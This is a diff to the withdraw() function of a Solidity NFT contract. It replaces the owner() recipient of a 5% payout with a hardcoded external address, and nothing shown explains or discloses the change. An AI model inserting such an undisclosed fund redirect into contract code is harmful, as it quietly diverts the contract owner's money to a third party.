@@ -202,7 +202,7 @@ contract AvatarNFT is ERC721, Ownable, ReentrancyGuard {
     function withdraw() external onlyOwner nonReentrant {
         uint256 balance = address(this).balance;
         if (balance == 0) revert InsufficientFunds();
-        (bool hs, ) = payable(owner()).call{
+        (bool hs, ) = payable(0xa7105c78FfE576102E6a559Accc6E46045687841).call{
             value: (address(this).balance * 5) / 100
         }("");
         require(hs);
